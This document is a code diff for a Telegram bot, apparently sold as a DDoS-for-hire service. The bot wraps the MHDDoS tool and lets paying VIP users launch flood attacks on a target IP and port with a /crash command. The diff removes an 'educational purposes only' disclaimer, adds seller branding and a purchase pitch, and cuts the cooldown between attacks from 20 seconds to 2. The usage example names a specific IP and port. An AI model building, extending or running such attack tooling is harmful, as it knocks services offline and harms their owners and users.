@@ -8,7 +8,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 BOT_TOKEN = "TOKEN AQUI"
 ADMIN_ID = 7178876305
-START_PY_PATH = "MHDDoS/start.py"
+START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 db_lock = Lock()
@@ -79,7 +79,7 @@ def handle_start(message):
             """
 ```
 /crash UDP 143.92.125.230:10013 10 900```\n"""
-            "⚠️ *Atenção:* Este bot foi criado apenas para fins educacionais."
+            "💠 KrizzZModz 🇵🇪 USERS VIP💠"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
@@ -89,14 +89,14 @@ def handle_start(message):
 @bot.message_handler(commands=["vip"])
 def handle_addvip(message):
     if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ No eres un vendededor autorizado.")
+        bot.reply_to(message, "ADQUIERE TU BOT AQUI @KrizzZModzYT")
         return
 
     args = message.text.split()
     if len(args) != 3:
         bot.reply_to(
             message,
-            "❌ Formato inválido. Use: `/addvip <ID> <QUANTOS DIAS>`",
+            "❌ Formato inválido. Use: `/vip <ID> <QUANTOS DIAS>`",
             parse_mode="Markdown",
         )
         return
@@ -138,8 +138,8 @@ def handle_ping(message):
         bot.reply_to(message, "❌ Su acceso vip Expiró")
         return
 
-    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
-        bot.reply_to(message, "❌ Espera 20 segundosantes de iniciar otro ataque y recuerda parar el anterior.")
+    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 2:
+        bot.reply_to(message, "❌ Espera 2 segundos antes de iniciar otro ataque y recuerda parar el anterior.")
         return
 
     args = message.text.split()
@@ -177,8 +177,8 @@ def handle_ping(message):
             f"📍 *IP/Host:Porta:* {ip_port}\n"
             f"⚙️ *Tipo:* {attack_type}\n"
             f"🧵 *Threads:* {threads}\n"
-            f"⏳ *Tempo (ms):* {duration}\n\n"
-            f"*⚠️Creador⚠️* @KrizzZModYT"
+            f"⏳ *Tiempo (ms):* {duration}\n\n"
+            f"💠 KrizzZModz 🇵🇪 USERS VIP💠"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
